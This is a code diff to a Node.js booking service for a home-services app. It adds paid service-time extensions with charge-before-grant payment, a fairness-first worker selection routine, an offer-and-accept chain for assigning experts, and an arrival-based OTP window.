@@ -5,8 +5,6 @@
 // reads addresses / moves the customer wallet via the auth service, and emits booking.* events
 // (consumed by dispatch, wallet, payment and notification). Realtime booking:update messages
 // are published to Redis and relayed by the gateway's socket hub.
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import express from 'express'
 import {
   makePool, migrate, nowIso, makeAdminAuth, inScope, internalOnly,
@@ -26,6 +24,7 @@ const CATALOG_URL = (process.env.CATALOG_URL || 'http://localhost:4001').replace
 const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')
 const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
 const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
+const PAYMENT_URL = (process.env.PAYMENT_URL || 'http://localhost:4008').replace(/\/$/, '')
 
 // A single malformed request must never take the service down.
 process.on('unhandledRejection', (e) => console.error('[booking] unhandledRejection:', e?.message || e))
@@ -124,25 +123,111 @@ async function init() {
       created       TIMESTAMPTZ NOT NULL DEFAULT now(),
       updated       TIMESTAMPTZ NOT NULL DEFAULT now()
     )`,
+    // Service extensions — extra paid time bought once the booked duration runs out. The original
+    // service price is NEVER rewritten: these two columns accumulate alongside `total` so the
+    // invoice can show the two lines separately and worker settlement keeps using the base total.
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS extension_minutes INTEGER NOT NULL DEFAULT 0`,
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS extension_total INTEGER NOT NULL DEFAULT 0`,
+    // One row per request, approved or not — declines are kept because "how often do we ask for
+    // more time, and why" is the signal that tells you your duration estimates are wrong.
+    `CREATE TABLE IF NOT EXISTS booking_extensions (
+      id SERIAL PRIMARY KEY,
+      booking_id INTEGER NOT NULL,
+      requested_by TEXT NOT NULL DEFAULT 'worker',  -- worker | customer
+      worker_id INTEGER,
+      minutes INTEGER NOT NULL,
+      price INTEGER NOT NULL DEFAULT 0,             -- what the customer pays (0 when absorbed)
+      payout INTEGER NOT NULL DEFAULT 0,            -- what the worker earns for it
+      reason_code TEXT NOT NULL DEFAULT '',
+      reason_text TEXT NOT NULL DEFAULT '',
+      status TEXT NOT NULL DEFAULT 'pending',       -- pending | approved | declined | cancelled
+      payment_method TEXT NOT NULL DEFAULT '',
+      created TIMESTAMPTZ NOT NULL DEFAULT now(),
+      decided TIMESTAMPTZ
+    )`,
+    // Authoritative end of the service clock. Needed because approved time is granted FROM THE
+    // MOMENT OF APPROVAL once a job has already overrun — start + booked + extension_minutes can't
+    // express that, and a late grant would otherwise buy minutes that had already elapsed.
+    // NULL means "never extended": clients fall back to start + booked.
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS service_end_at TIMESTAMPTZ`,
+    /* Offer chain. A booking is no longer handed straight to an expert: it is OFFERED to one at a
+     * time, who has OFFER_TTL_SEC to accept. offer_worker_id/offer_at hold the live offer;
+     * declined_by remembers everyone who said no (or let it lapse) so the chain always moves on
+     * instead of re-asking the same person. */
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS offer_worker_id INTEGER`,
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS offer_at TIMESTAMPTZ`,
+    `ALTER TABLE bookings ADD COLUMN IF NOT EXISTS declined_by INTEGER[] NOT NULL DEFAULT '{}'`,
+    `CREATE INDEX IF NOT EXISTS ix_ext_booking ON booking_extensions(booking_id)`,
     `CREATE INDEX IF NOT EXISTS ix_book_user ON bookings(user_id)`,
     `CREATE INDEX IF NOT EXISTS ix_book_worker ON bookings(worker_id)`,
     `CREATE INDEX IF NOT EXISTS ix_book_status ON bookings(status)`,
   ])
+  // Bookings extended before service_end_at existed: replay their approved grants under the same
+  // never-shorten rule so an in-flight job doesn't keep the old "already elapsed" end. Idempotent —
+  // only rows that were extended and have no end stored yet.
+  const { rows: legacy } = await pool.query(
+    'SELECT * FROM bookings WHERE service_end_at IS NULL AND extension_minutes > 0 AND started_at IS NOT NULL')
+  for (const r of legacy) {
+    const b = rowTo(r)
+    const { rows: exts } = await pool.query(
+      "SELECT minutes, decided FROM booking_extensions WHERE booking_id=$1 AND status='approved' ORDER BY decided", [b.id])
+    let end = currentEndMs(b)
+    for (const e of exts) end = Math.max(end, e.decided ? new Date(e.decided).getTime() : end) + e.minutes * 60000
+    await pool.query('UPDATE bookings SET service_end_at=$2 WHERE id=$1', [b.id, new Date(end).toISOString()])
+    console.log(`[booking] backfilled service_end_at for ${b.ref} -> ${new Date(end).toISOString()}`)
+  }
   console.log('[booking] Postgres ready (bookings, favourites)')
 }
 
 /* ---------- helpers ---------- */
 const rowTo = (r) => (r ? { ...r, items: typeof r.items === 'string' ? JSON.parse(r.items) : r.items, settled: !!r.settled } : null)
+
+/* ---------- the service clock ----------
+ * Booked length, from the durationId first (authoritative) and the free-text label as a fallback —
+ * the same rule dispatch, worker and the apps apply, so the four can't disagree. */
+const DUR_MIN = { '30m': 30, '60m': 60, '90m': 90, '2h': 120, '2h30': 150, '3h': 180, '3h30': 210, '4h': 240 }
+function bookedMinutes(b) {
+  const id = (b.items || [])[0]?.durationId
+  if (id && DUR_MIN[id]) return DUR_MIN[id]
+  const s = String(b.duration || '')
+  const n = parseInt(s, 10)
+  if (!n) return 60
+  return /h/i.test(s) && !/min/i.test(s) ? n * 60 : n
+}
+/** When the clock currently runs out: the stored end once extended, else start + booked. */
+function currentEndMs(b) {
+  if (b.service_end_at) return new Date(b.service_end_at).getTime()
+  if (!b.started_at) return null
+  return new Date(b.started_at).getTime() + bookedMinutes(b) * 60000
+}
+/* Granting time NEVER shortens the clock and NEVER hands over minutes that have already burnt:
+ * from the later of "now" and the current end. Past the end (the case that prompted this) the
+ * worker gets the full granted stretch from approval; with time still left it is added to what
+ * remains, which is what both sides mean by "15 more minutes". */
+const extendedEndMs = (b, minutes, atMs = Date.now()) =>
+  Math.max(currentEndMs(b) ?? atMs, atMs) + minutes * 60000
 async function getBooking(id) { if (!Number.isFinite(id)) return null; const { rows } = await pool.query('SELECT * FROM bookings WHERE id=$1', [id]); return rowTo(rows[0]) }
 
-// Withhold the check-in OTP until 1h before a scheduled slot; expose scheduled_at.
+/* Is the check-in window open — i.e. may the customer see and use the start OTP?
+ * Open 1h before a scheduled slot (instant bookings are always open), and ALSO as soon as the
+ * worker marks themselves arrived: someone standing at the door outranks the clock, and a worker
+ * who turns up early must not leave the customer facing "Worker has arrived — share your start
+ * OTP" next to an empty box. Shared by publicBooking (what the customer is shown), /track and
+ * /verify-otp so the three can never disagree about whether the code is usable. */
+const OTP_ON_ARRIVAL_STATES = ['arrived', 'in_progress']
+const serviceWindowOpen = (b) => {
+  if (!b) return false
+  if (OTP_ON_ARRIVAL_STATES.includes(b.status)) return true
+  const s = scheduledStartMs(b)
+  return s == null ? true : Date.now() >= s - OTP_LEAD_MS
+}
+
+// Withhold the check-in OTP until that window opens; expose scheduled_at.
 function publicBooking(b) {
   if (!b) return b
-  const start = scheduledStartMs(b)
-  const open = start == null ? true : Date.now() >= start - OTP_LEAD_MS
-  return { ...b, scheduled_at: start, otp_released: open, service_otp: open ? b.service_otp : null }
+  const open = serviceWindowOpen(b)
+  return { ...b, scheduled_at: scheduledStartMs(b), otp_released: open, service_otp: open ? b.service_otp : null }
 }
-const serviceWindowOpen = (b) => { const s = scheduledStartMs(b); return s == null ? true : Date.now() >= s - OTP_LEAD_MS }
 
 function distanceKm(aLat, aLng, bLat, bLng) {
   if ([aLat, aLng, bLat, bLng].some((v) => v == null)) return null
@@ -150,6 +235,87 @@ function distanceKm(aLat, aLng, bLat, bLng) {
   const dLat = toR(bLat - aLat), dLng = toR(bLng - aLng)
   const s = Math.sin(dLat / 2) ** 2 + Math.cos(toR(aLat)) * Math.cos(toR(bLat)) * Math.sin(dLng / 2) ** 2
   return R * 2 * Math.atan2(Math.sqrt(s), Math.sqrt(1 - s))
+}
+
+/* ---------- worker selection: zone-first, load-balanced, never double-books ----------
+   Both assignment paths (immediate-on-create and the 15s autoAssignSweep) route through here, so
+   they can't drift apart. Previously only the sweep excluded busy experts while the create path
+   sorted on raw distance alone — and because a booking is assigned the moment it's created, the
+   sweep never saw it and the busy check never ran. One expert standing a couple of metres closer
+   than the rest therefore won every single job in the zone, however many he was already holding.
+
+   Order of preference:
+     1. ZONE   - on-shift experts for the booking's zone (falls back to any qualified expert only
+                 when the zone has nobody on shift, so a booking still gets served).
+     2. FREE   - anyone already on an active job is dropped entirely.
+     3. FAIR   - fewest active jobs first, then fewest lifetime jobs = round-robin. With everyone
+                 idle this rotates through the roster instead of pinning one person.
+     4. NEAR   - distance only breaks ties, and only beyond NEAR_TIE_M. Below that the workers are
+                 effectively at the same place and a 1-2 m edge must not outrank fairness. */
+const AA_BUSY_STATES = ['worker_assigned', 'on_the_way', 'arrived', 'in_progress']
+const NEAR_TIE_M = 250   // within this radius, treat distances as equal and let fairness decide
+
+async function busyWorkerIds() {
+  const { rows } = await pool.query(
+    'SELECT DISTINCT worker_id FROM bookings WHERE worker_id IS NOT NULL AND status = ANY($1)', [AA_BUSY_STATES])
+  return new Set(rows.map((r) => r.worker_id))
+}
+
+// Active-job count per worker — the round-robin signal. Zero rows for idle workers, so callers
+// must default to 0 rather than assume a key exists.
+async function activeJobCounts() {
+  const { rows } = await pool.query(
+    'SELECT worker_id, count(*)::int n FROM bookings WHERE worker_id IS NOT NULL AND status = ANY($1) GROUP BY worker_id', [AA_BUSY_STATES])
+  return new Map(rows.map((r) => [r.worker_id, r.n]))
+}
+
+// Resolve the zone from the pincode when it wasn't stamped at create time (or the zone was added later).
+async function resolveZoneId(zoneId, pincode) {
+  if (zoneId) return zoneId
+  if (!pincode) return null
+  const zr = await tryGet(CATALOG_URL, `/api/internal/zone-for?pincode=${encodeURIComponent(pincode)}`, null)
+  return (zr?.zoneId && zr.live) ? zr.zoneId : null
+}
+
+/* Returns the expert to assign, or null when nobody is free. `serviceNames` is a comma-joined list. */
+async function pickWorker({ zoneId, pincode, serviceNames, custLat, custLng, requireZone = false, exclude = [] }) {
+  const zid = await resolveZoneId(zoneId, pincode)
+
+  // 1) Zone + on-shift + qualified.
+  let cands = []
+  if (zid) {
+    const feed = await tryGet(WORKER_URL, `/internal/on-shift?zone_id=${zid}&services=${encodeURIComponent(serviceNames)}`, { workers: [] })
+    cands = (feed.workers || []).map((w) => ({ id: w.id, name: w.name, rating: w.rating, online: !!w.available, lat: w.last?.lat, lng: w.last?.lng, jobs: 0 }))
+  }
+  // Fall back to any qualified active expert when the zone has nobody rostered. The sweep asks for
+  // requireZone so it never assigns outside the zone; the create path prefers serving the customer.
+  if (!cands.length && !requireZone) {
+    const list = await tryGet(WORKER_URL, `/internal/workers/for-service?services=${encodeURIComponent(serviceNames)}`, [])
+    cands = (Array.isArray(list) ? list : []).map((w) => ({ id: w.id, name: w.name, rating: w.rating, online: !!w.online, lat: w.lat, lng: w.lng, jobs: w.jobs || 0 }))
+  }
+  if (!cands.length) return null
+
+  // 2) Online, not already on a job, and not someone this booking has already been offered to.
+  const busy = await busyWorkerIds()
+  const skip = new Set((exclude || []).map(Number))
+  const free = cands.filter((w) => w.online && !busy.has(w.id) && !skip.has(Number(w.id)))
+  if (!free.length) return null
+
+  // 3)+4) Fairness first, distance only as a real tie-break.
+  const active = await activeJobCounts()
+  const distM = (w) => { const km = distanceKm(custLat, custLng, w.lat, w.lng); return km == null ? null : km * 1000 }
+  free.sort((a, b) => {
+    const aa = active.get(a.id) || 0, ab = active.get(b.id) || 0
+    if (aa !== ab) return aa - ab                       // fewest active jobs
+    if ((a.jobs || 0) !== (b.jobs || 0)) return (a.jobs || 0) - (b.jobs || 0)  // then fewest lifetime jobs
+    const da = distM(a), db = distM(b)
+    if (da == null && db == null) return 0
+    if (da == null) return 1
+    if (db == null) return -1
+    if (Math.abs(da - db) <= NEAR_TIE_M) return 0       // same place → keep the fair order above
+    return da - db
+  })
+  return { ...free[0], zoneId: zid }
 }
 
 async function cancelCfg() {
@@ -164,6 +330,65 @@ async function cancelCfg() {
 }
 
 const emitBookingUpdate = async (id) => publishRealtime(REDIS_URL, `booking:${id}`, 'booking:update', await getBooking(id))
+
+/* ═══════════════ Service extensions ═══════════════
+ * Extra paid time, bought only with the customer's consent. The worker (or later the customer)
+ * raises a request once the booked time is running out; the customer approves and pays; only then
+ * does the job clock grow. Nothing here rewrites the original service price — see the two
+ * `extension_*` columns.
+ */
+
+// Why more time is needed, and — the part that matters — who pays for it. A worker who simply ran
+// over their own estimate cannot bill the customer for it, so `chargeable: false` extends the clock
+// at no charge and the cost sits with the business. This is the whole reason a reason code exists.
+const EXT_REASONS = {
+  customer_request: { label: 'Customer requested additional work', chargeable: true },
+  more_area: { label: 'More area/items than expected', chargeable: true },
+  service_condition: { label: 'Service condition requires more time', chargeable: true },
+  customer_added_task: { label: 'Customer added another task', chargeable: true },
+  scope_incomplete: { label: 'Original scope incomplete', chargeable: false },
+  other: { label: 'Other', chargeable: true },
+}
+
+const extDto = (r) => r && ({
+  id: r.id, bookingId: r.booking_id, requestedBy: r.requested_by, minutes: r.minutes,
+  price: r.price, payout: r.payout, reasonCode: r.reason_code,
+  reasonLabel: EXT_REASONS[r.reason_code]?.label || r.reason_code,
+  reasonText: r.reason_text, status: r.status, created: r.created, decided: r.decided,
+  // How the customer paid for this extension (razorpay | wallet | ''), for the history + invoice.
+  paymentMethod: r.payment_method || '',
+})
+
+const extensionsFor = async (bookingId) =>
+  (await pool.query('SELECT * FROM booking_extensions WHERE booking_id=$1 ORDER BY id', [bookingId])).rows.map(extDto)
+
+// The service whose rule governs this booking — the first booked item, same one the timer uses.
+const ruleForBooking = async (b) =>
+  tryGet(CATALOG_URL, `/api/internal/extension-rule/${encodeURIComponent((b.items || [])[0]?.id || '')}`, null)
+
+/**
+ * Validate a request against the service's rule and price it. Fails closed: no rule, disabled,
+ * unknown block, too many requests or over the time ceiling all mean "cannot extend".
+ */
+async function priceExtension(b, minutes, reasonCode) {
+  const rule = await ruleForBooking(b)
+  if (!rule || !rule.enabled) return { error: 'Extensions are not available for this service' }
+  const block = (rule.blocks || []).find((x) => x.mins === minutes)
+  if (!block) return { error: 'That extension length is not offered for this service' }
+  const rows = await extensionsFor(b.id)
+  if (rows.some((r) => r.status === 'pending')) return { error: 'An extension request is already awaiting a decision' }
+  const approved = rows.filter((r) => r.status === 'approved')
+  if (approved.length >= rule.maxRequests) return { error: `This booking has already been extended ${rule.maxRequests} time(s)` }
+  const usedMin = approved.reduce((s, r) => s + r.minutes, 0)
+  if (usedMin + minutes > rule.maxTotalMin) {
+    return { error: `Maximum ${rule.maxTotalMin} min of extra time per booking — ${rule.maxTotalMin - usedMin} min left` }
+  }
+  const reason = EXT_REASONS[reasonCode]
+  if (!reason) return { error: 'Pick a reason for the extra time' }
+  // Non-chargeable reasons still extend the clock, at no cost to the customer and no extra pay.
+  return reason.chargeable ? { price: block.price, payout: block.payout } : { price: 0, payout: 0 }
+}
+
 async function anyActiveWorker(serviceNames) {
   const r = await tryGet(WORKER_URL, `/internal/workers/active-for?services=${encodeURIComponent((serviceNames || []).join(','))}`, null)
   return r ? !!r.available : true // default true if worker service is unavailable
@@ -238,6 +463,109 @@ async function slotAvailability(date, time, pincode, serviceNames) {
 const app = express()
 app.use(express.json({ limit: '6mb' }))
 app.get('/health', (_q, res) => res.json({ service: 'booking', ok: true }))
+
+// Worker-raised request, proxied by dispatch (which owns the worker's session).
+app.post('/api/internal/bookings/:id/extension', internalOnly, async (req, res) => {
+  const b = await getBooking(Number(req.params.id))
+  if (!b) return res.status(404).json({ error: 'Not found' })
+  if (b.status !== 'in_progress') return res.status(409).json({ error: 'The service is not in progress' })
+  const minutes = Math.round(Number(req.body?.minutes) || 0)
+  const reasonCode = String(req.body?.reasonCode || '')
+  const priced = await priceExtension(b, minutes, reasonCode)
+  if (priced.error) return res.status(400).json({ error: priced.error })
+  const { rows } = await pool.query(
+    `INSERT INTO booking_extensions (booking_id, requested_by, worker_id, minutes, price, payout, reason_code, reason_text)
+     VALUES ($1,'worker',$2,$3,$4,$5,$6,$7) RETURNING *`,
+    [b.id, b.worker_id || null, minutes, priced.price, priced.payout, reasonCode, String(req.body?.reasonText || '')])
+  const ext = extDto(rows[0])
+  await emitBookingUpdate(b.id)
+  publishEvent(REDIS_URL, 'booking.extension.requested', { booking: b, extension: ext })
+  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: b.worker_id, actorName: b.pro_name, action: 'job.extension.request', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Requested +${minutes} min (₹${priced.price}) · ${EXT_REASONS[reasonCode].label}` })
+  res.json({ ok: true, extension: ext })
+})
+
+app.get('/api/internal/bookings/:id/extensions', internalOnly, async (req, res) =>
+  res.json(await extensionsFor(Number(req.params.id))))
+
+/* ---------- customer-facing ---------- */
+// What the approval sheet needs: the pending ask plus everything already granted.
+app.get('/api/bookings/:id/extensions', auth, async (req, res) => {
+  const b = await getBooking(Number(req.params.id))
+  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
+  const rows = await extensionsFor(b.id)
+  res.json({
+    pending: rows.find((r) => r.status === 'pending') || null,
+    extensions: rows,
+    extensionMinutes: b.extension_minutes || 0,
+    extensionTotal: b.extension_total || 0,
+  })
+})
+
+app.post('/api/bookings/:id/extensions/:extId/decline', auth, async (req, res) => {
+  const b = await getBooking(Number(req.params.id))
+  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
+  const { rows } = await pool.query(
+    `UPDATE booking_extensions SET status='declined', decided=now()
+     WHERE id=$1 AND booking_id=$2 AND status='pending' RETURNING *`, [Number(req.params.extId), b.id])
+  if (!rows.length) return res.status(409).json({ error: 'That request is no longer pending' })
+  const ext = extDto(rows[0])
+  await emitBookingUpdate(b.id)
+  publishEvent(REDIS_URL, 'booking.extension.declined', { booking: b, extension: ext })
+  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: b.user_id, action: 'job.extension.decline', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Declined +${ext.minutes} min` })
+  res.json({ ok: true, extension: ext })
+})
+
+// Approve = pay, then grant. The charge happens FIRST: if the money doesn't move, the clock
+// doesn't either, so a worker can never be told to carry on against an unpaid extension.
+app.post('/api/bookings/:id/extensions/:extId/approve', auth, async (req, res) => {
+  const b = await getBooking(Number(req.params.id))
+  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
+  const row = (await pool.query('SELECT * FROM booking_extensions WHERE id=$1 AND booking_id=$2',
+    [Number(req.params.extId), b.id])).rows[0]
+  if (!row || row.status !== 'pending') return res.status(409).json({ error: 'That request is no longer pending' })
+
+  let method = ''
+  if (row.price > 0) {
+    // Charge FIRST: if the money doesn't move, the clock doesn't either, so a worker is never told
+    // to carry on against an unpaid extension. Two settled rails:
+    //  - Razorpay (paymentId present): the customer completed a gateway checkout in the app; the
+    //    payment service verifies the signature and records the transaction. This is the default path.
+    //  - Wallet (no paymentId): unchanged legacy fallback — debits the customer wallet in auth.
+    const paymentId = String(req.body?.paymentId || '').trim()
+    if (paymentId) {
+      try {
+        await internalPost(PAYMENT_URL, '/api/internal/payment/extension',
+          { bookingId: b.id, extId: row.id, customerId: b.user_id, amount: row.price, paymentId })
+        method = 'razorpay'
+      } catch (e) {
+        return res.status(402).json({ error: e.message || 'Payment could not be confirmed', amount: row.price })
+      }
+    } else {
+      try {
+        await internalPost(AUTH_URL, `/api/internal/users/${b.user_id}/wallet`,
+          { type: 'debit', title: `Service extension +${row.minutes} min`, amount: row.price })
+        method = 'wallet'
+      } catch (e) {
+        return res.status(402).json({ error: e.message || 'Insufficient wallet balance', needsTopUp: true, amount: row.price })
+      }
+    }
+  }
+
+  const { rows } = await pool.query(
+    `UPDATE booking_extensions SET status='approved', decided=now(), payment_method=$2 WHERE id=$1 RETURNING *`,
+    [row.id, method])
+  // extension_minutes/total stay as the honest tally of what was granted and paid (invoice + the
+  // "+15 min added" line); service_end_at carries where the clock actually now ends.
+  await pool.query(
+    'UPDATE bookings SET extension_minutes = extension_minutes + $2, extension_total = extension_total + $3, service_end_at = $4 WHERE id=$1',
+    [b.id, row.minutes, row.price, new Date(extendedEndMs(b, row.minutes)).toISOString()])
+  const ext = extDto(rows[0])
+  const after = await getBooking(b.id)
+  await emitBookingUpdate(b.id)
+  publishEvent(REDIS_URL, 'booking.extension.approved', { booking: after, extension: ext })
+  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: b.user_id, action: 'job.extension.approve', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Approved +${ext.minutes} min · ₹${ext.price}`, meta: { amount: ext.price } })
+  res.json({ ok: true, extension: ext, extensionMinutes: after.extension_minutes, extensionTotal: after.extension_total })
+})
 
 // App-scoped AI support chat. Returns { reply } on success, or { reply: null, fallback: true }
 // so the app uses its built-in offline assistant (also the default when no AI_API_KEY is set).
@@ -334,7 +662,22 @@ app.get('/api/bookings/:id', auth, async (req, res) => {
   let travel = {}
   const d = distanceKm(b.worker_lat, b.worker_lng, b.cust_lat, b.cust_lng)
   if (d != null) travel = { pos: { lat: b.worker_lat, lng: b.worker_lng }, dist: +d.toFixed(1), eta: Math.max(1, Math.round(d * 2.5)) }
-  res.json({ ...publicBooking(b), serviceAvailable, pro, ...travel })
+  // Full structured address so the tracking screen can show the COMPLETE address — flat/house +
+  // apartment/building + area — not just the geocoded area line the booking stores. Resolved
+  // read-only from the saved address stamped at checkout; free-typed/legacy bookings keep the text.
+  let addr = null
+  if (b.address_id) {
+    const addrs = await tryGet(AUTH_URL, `/api/internal/users/${b.user_id}/addresses`, [])
+    const a = (addrs || []).find((x) => Number(x.id) === Number(b.address_id))
+    if (a) addr = {
+      label: a.label || '', house: a.house || '', floor: a.floor || '', apartment: a.apartment || '',
+      street: a.street || '', landmark: a.landmark || '', line: a.line || '', city: a.city || '', pincode: a.pincode || '',
+    }
+  }
+  // Include the full extension history (minutes/amount/method/status) so the booking detail and the
+  // invoice can itemise the paid extra time alongside the base service.
+  const extensions = await extensionsFor(b.id)
+  res.json({ ...publicBooking(b), serviceAvailable, pro, addr, extensions, ...travel })
 })
 
 // Slot availability for the Schedule screen: per-hour capacity for a date, given the pincode + services.
@@ -455,6 +798,21 @@ app.post('/api/bookings', auth, async (req, res) => {
       body.lat ?? null, body.lng ?? null, pincode || null, zoneId, nowIso(), addressId ?? null])
   let booking = rowTo(ins.rows[0])
 
+  // Record the payment in the customer's transaction ledger for NON-wallet methods too. Wallet
+  // payments already posted a real balance-moving debit above; UPI/card/PhonePe paid the gateway and
+  // cash is paid to the expert after the service, so this is a ledger-only passbook entry that does
+  // NOT move the wallet balance — it just makes every booking visible in Transactions (and in the
+  // admin customer ledger). Best-effort + idempotent on the booking ref: it never fails or
+  // double-posts the booking.
+  if (!isWallet) {
+    const methodLabel = isCash ? 'Cash' : payment === 'card' ? 'Card'
+      : payment === 'phonepe' ? 'PhonePe' : payment === 'upi' ? 'UPI' : (payment || 'Online')
+    internalPost(AUTH_URL, `/api/internal/users/${req.user.id}/wallet`, {
+      ledgerOnly: true, type: 'debit', kind: 'BOOKING_PAYMENT',
+      title: `Booking Payment · ${methodLabel}`, amount: priced.total, ref: booking.ref,
+    }).catch((e) => console.error('[booking] ledger record failed:', e?.message || e))
+  }
+
   // Assign an expert immediately: the customer's chosen worker, else the nearest ONLINE worker
   // offering the service (demo auto-assign). Additive — if none is found the booking stays
   // 'confirmed' and normal dispatch can still pick it up. Never double-assigns (worker_id IS NULL).
@@ -470,24 +828,20 @@ app.post('/api/bookings', auth, async (req, res) => {
     const wp = await tryGet(WORKER_URL, `/internal/workers/${chosenId}/public-profile`, null)
     if (wp && wp.name) await assignWorker(chosenId, wp.name, wp.rating)
   } else {
-    // "Any available worker" → pick the nearest online expert for this service.
+    // "Any available worker" → zone-first, load-balanced pick (see pickWorker). Leaving the booking
+    // unassigned when everyone in the zone is busy is deliberate: autoAssignSweep retries every 15s
+    // and hands it to the first expert who frees up, which beats stacking a fourth job on someone
+    // already mid-service.
     const svc = priced.items.map((i) => i.name).join(',')
-    const cand = await tryGet(WORKER_URL, `/internal/workers/for-service?services=${encodeURIComponent(svc)}`, [])
-    if (Array.isArray(cand) && cand.length) {
-      const cl = booking.cust_lat, cn = booking.cust_lng
-      const dist = (w) => (w.lat != null && cl != null && cn != null) ? distanceKm(cl, cn, w.lat, w.lng) : null
-      const online = cand.filter((w) => w.online)
-      const list = online.length ? online : cand
-      list.sort((a, b2) => {
-        const da = dist(a), db = dist(b2)
-        if (da != null && db != null) return da - db
-        if (da != null) return -1
-        if (db != null) return 1
-        return (b2.jobs || 0) - (a.jobs || 0) // no GPS → most-experienced first
-      })
-      const pick = list[0]
-      if (pick) await assignWorker(pick.id, pick.name, pick.rating)
-    }
+    const pick = await pickWorker({
+      zoneId: booking.zone_id, pincode: booking.pincode, serviceNames: svc,
+      custLat: booking.cust_lat, custLng: booking.cust_lng,
+    })
+    // OFFER, don't assign. The expert has OFFER_TTL_SEC to accept; a decline or a lapse passes the
+    // booking to the next available expert (see offerSweep). The booking stays 'confirmed' until
+    // somebody accepts, which is what the customer's "finding your expert" state reflects.
+    if (pick) await offerTo(booking, pick)
+    else console.log(`[booking] ${booking.ref}: no free expert right now — leaving for offerSweep`)
   }
 
   // Record campaign redemptions (per-customer usage caps + coupon counts). Best-effort — a
@@ -659,7 +1013,9 @@ app.get('/api/admin/bookings/:id', adminAuth, async (req, res) => {
   const b = await getBooking(Number(req.params.id))
   if (!b || !bookingInScope(req, b)) return res.status(404).json({ error: 'Not found' })
   const u = await tryGet(AUTH_URL, `/api/internal/users/${b.user_id}`, null)
-  res.json({ ...b, customer: u?.user?.name || 'Customer' })
+  // Extensions ride along with the booking: an admin looking at what was charged needs to see the
+  // extra time too, not just the base service.
+  res.json({ ...b, customer: u?.user?.name || 'Customer', extensions: await extensionsFor(b.id) })
 })
 // Settlement breakdown for a booking — real money math: the payment-gateway fee + its GST are the
 // actual charges a UPI/card payment incurs (0 on wallet); worker payout comes from the stored comp
@@ -883,6 +1239,22 @@ app.get('/api/internal/bookings', internalOnly, async (req, res) => {
   const { rows } = await pool.query(sql, vals)
   res.json(rows.map(rowTo))
 })
+/* Dispatch: the expert rejected the offer. Records the decline and frees the booking so the very
+ * next offerSweep hands it to someone else — the expert should not have to wait out their own
+ * 2-minute window after saying no. */
+app.post('/api/internal/bookings/:id/decline', internalOnly, async (req, res) => {
+  const id = Number(req.params.id)
+  const workerId = Number(req.body?.worker_id)
+  if (!id || !workerId) return res.status(400).json({ ok: false, error: 'bad decline' })
+  const b = await getBooking(id)
+  // Only the expert actually holding the offer can decline it; a stale client must not knock the
+  // booking off whoever it has since moved to.
+  if (!b || b.worker_id != null || Number(b.offer_worker_id) !== workerId) return res.json({ ok: true, stale: true })
+  await declineOffer(id, workerId, 'rejected the offer')
+  offerSweep().catch(() => {})   // re-offer now rather than up to 10s later
+  res.json({ ok: true })
+})
+
 // Admin (via payment service): mark a cancelled booking as refunded.
 app.post('/api/internal/bookings/:id/refund', internalOnly, async (req, res) => {
   await pool.query("UPDATE bookings SET payment_status='refunded', refund_status='refunded', refund=COALESCE(refund, total) WHERE id=$1", [Number(req.params.id)])
@@ -891,8 +1263,22 @@ app.post('/api/internal/bookings/:id/refund', internalOnly, async (req, res) => 
 // Dispatch: atomic claim of a job by a worker.
 app.post('/api/internal/bookings/:id/assign', internalOnly, async (req, res) => {
   const { worker_id, pro_name, pro_rating } = req.body || {}
+  /* Only the expert the booking is CURRENTLY offered to may claim it.
+   *
+   * Without the offer_worker_id test this checked nothing but "still unclaimed", so a worker whose
+   * `offered_booking` had gone stale could accept a job that had since moved to someone else — the
+   * booking then showed up on a worker who was never offered it, while the one who was offered it
+   * sat waiting. `offer_worker_id IS NULL` stays allowed for the direct-assign paths (a
+   * customer-chosen expert, and admin reassignment), which never go through an offer.
+   *
+   * Clearing the offer in the same statement is what ends the chain: claim and teardown are one
+   * atomic write, so a sweep running concurrently cannot re-offer a booking already taken.
+   */
   const upd = await pool.query(
-    "UPDATE bookings SET worker_id=$1, pro_name=$2, pro_rating=$3, status='worker_assigned' WHERE id=$4 AND worker_id IS NULL AND status='confirmed' RETURNING *",
+    `UPDATE bookings SET worker_id=$1, pro_name=$2, pro_rating=$3, status='worker_assigned',
+       offer_worker_id=NULL, offer_at=NULL
+      WHERE id=$4 AND worker_id IS NULL AND status='confirmed'
+        AND (offer_worker_id IS NULL OR offer_worker_id = $1) RETURNING *`,
     [worker_id, pro_name || 'Expert', pro_rating || 4.8, Number(req.params.id)])
   if (!upd.rowCount) return res.json({ ok: false }) // already claimed
   await emitBookingUpdate(Number(req.params.id))
@@ -943,38 +1329,78 @@ subscribeEvents(REDIS_URL, 'booking', async (type, data) => {
    the best FREE on-shift qualified expert in that zone — the "instant"/Snabbit push model, so the
    customer doesn't wait for a worker to pull. Inert until you roster shifts + create live zones.
    Runs every 15s (ahead of the 5-min auto-cancel, so rostered supply gets first shot). */
-const AA_ACTIVE = ['worker_assigned', 'on_the_way', 'arrived', 'in_progress']
-async function autoAssignSweep() {
+const AA_ACTIVE = AA_BUSY_STATES
+/* ---------- the offer chain ----------
+ * Bookings used to be stamped 'worker_assigned' the instant they were created, so the expert had
+ * no say: no accept, no reject, and a job could land on someone who never answered. Now a booking
+ * is OFFERED to one expert at a time. They get OFFER_TTL_SEC to accept; saying no — or saying
+ * nothing — passes it straight to the next available expert, and the customer's expert card
+ * updates over the existing booking:update socket once somebody accepts.
+ *
+ * If the chain runs out of experts the booking simply stays unassigned, which autoCancelNoService
+ * already handles: past dispatch_timeout_min it cancels and refunds in full.
+ */
